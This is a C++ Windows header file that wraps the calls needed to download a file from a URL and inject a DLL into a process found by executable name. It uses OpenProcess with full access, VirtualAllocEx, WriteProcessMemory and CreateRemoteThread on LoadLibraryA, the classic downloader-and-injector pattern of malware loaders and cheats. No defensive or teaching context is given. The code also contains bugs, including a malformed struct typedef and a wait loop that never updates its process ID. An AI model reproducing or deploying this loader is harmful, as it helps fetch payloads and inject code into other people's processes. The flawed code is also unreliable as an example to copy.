#pragma once
#include<iostream>
#include<string>
#include<Windows.h>
#include<thread>
#include<chrono>
#include<urlmon.h>
#pragma comment(lib, "urlmon.lib")
#include<TlHelp32.h>

typedef struct NtSystem {
	LPVOID Base;
	LPVOID BaseAddress;
	DWORD ProcId;
	HMODULE EntryPoint;
}; NtSystem* pSystem;

class NtSystemCall {
public:
	DWORD NtGetApplicationId(DWORD pId, LPCTSTR WindowTitle);
	BYTE NtGetPeImage(LPCTSTR Url, LPCTSTR PathToPeImage);
	LPCTSTR DbgPrint(LPCTSTR Msg);
	DWORD NtInjectProc(DWORD pId, LPCTSTR WindowTitle);
};

extern NtSystemCall Nt;

LPCTSTR NtSystemCall::DbgPrint(LPCTSTR Msg) {
	std::cout << Msg << "\n";
	return Msg;
}

BYTE NtSystemCall::NtGetPeImage(LPCTSTR Url, LPCTSTR PathToPeImage) {
	HRESULT PeImageResult = URLDownloadToFile(0, Url, PathToPeImage, 0, 0);
	return BYTE();
}

DWORD NtSystemCall::NtGetApplicationId(DWORD pId, LPCTSTR WindowTitle) {
	PROCESSENTRY32W NtProcEntry;
	DWORD pID = NULL;
	HANDLE NtSnapProc = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32W NtProcSnap = { 0 };

	NtProcSnap.dwSize = sizeof(PROCESSENTRY32);
	if (NtSnapProc == INVALID_HANDLE_VALUE) return 0;
	if (Process32First(NtSnapProc, &NtProcSnap) == FALSE)return 0;

	while (Process32Next(NtSnapProc, &NtProcSnap)) {
		if (!wcscmp(NtProcSnap.szExeFile, WindowTitle)) {
			CloseHandle(NtSnapProc);
			return NtProcSnap.th32ProcessID;
		}
	}
	CloseHandle(NtSnapProc);
	return pId;
}

DWORD NtSystemCall::NtInjectProc(DWORD pId, LPCTSTR WindowTitle) {
	const char* PE_IMAGE_PATH = ""; // path to pe image
	DWORD NtWindowProcById = Nt.NtGetApplicationId(pId, WindowTitle);
	while (!NtWindowProcById) {
		DWORD NtWindowProcById = Nt.NtGetApplicationId(pId, WindowTitle);
		std::this_thread::sleep_for(std::chrono::seconds(5));
	}
	HANDLE PE_IMAGE_ENTRY = OpenProcess(PROCESS_ALL_ACCESS, FALSE, NtWindowProcById);
	if (PE_IMAGE_ENTRY && PE_IMAGE_ENTRY != INVALID_HANDLE_VALUE) {
		void* PE_IMAGE_BUFFER = VirtualAllocEx(PE_IMAGE_ENTRY, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		WriteProcessMemory(PE_IMAGE_ENTRY, PE_IMAGE_BUFFER, PE_IMAGE_PATH, strlen(PE_IMAGE_PATH) + 1, 0);
		HANDLE PE_IMAGE_THREADS = CreateRemoteThread(PE_IMAGE_ENTRY, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, PE_IMAGE_BUFFER, 0, 0);
		if (PE_IMAGE_THREADS)
			CloseHandle(PE_IMAGE_THREADS);
		if (PE_IMAGE_ENTRY)
			CloseHandle(PE_IMAGE_ENTRY);

	}
	return pId;
}